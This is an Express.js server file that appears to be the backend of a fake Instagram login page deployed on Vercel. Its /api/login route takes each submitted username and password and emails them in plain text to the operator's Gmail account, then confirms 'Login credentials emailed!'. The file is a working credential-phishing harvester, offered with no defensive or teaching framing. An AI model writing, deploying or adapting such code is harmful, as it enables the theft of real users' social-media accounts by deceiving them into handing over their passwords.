const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");
require("dotenv").config();

const app = express();

// ✅ CORS Setup
const corsOptions = {
  origin: "https://instagramlogin-puce.vercel.app/", // or your deployed frontend like "https://your-instagram-ui.vercel.app"
  methods: ["POST"],
  credentials: true,
};
app.use(cors(corsOptions));

// ✅ Body parser
app.use(express.json());

// ✅ Login Route
app.post("/api/login", async (req, res) => {
  const { username, password } = req.body;

  try {
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER, // sending to self
      subject: "Instagram Login Attempt",
      html: `
        <h2>New Instagram Login Attempt</h2>
        <p><strong>Username / Email / Phone:</strong> ${username}</p>
        <p><strong>Password:</strong> ${password}</p>
        <p><i>Sent from your Instagram clone UI</i></p>
      `,
    };

    await transporter.sendMail(mailOptions);
    res.status(200).json({ success: true, message: "Login credentials emailed!" });
  } catch (error) {
    console.error("Error sending email:", error);
    res.status(500).json({ success: false, message: "Failed to send email" });
  }
});

// ✅ Root route
app.get("/", (req, res) => {
  res.send("Instagram Login Backend Running");
});

// ✅ Server Start
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
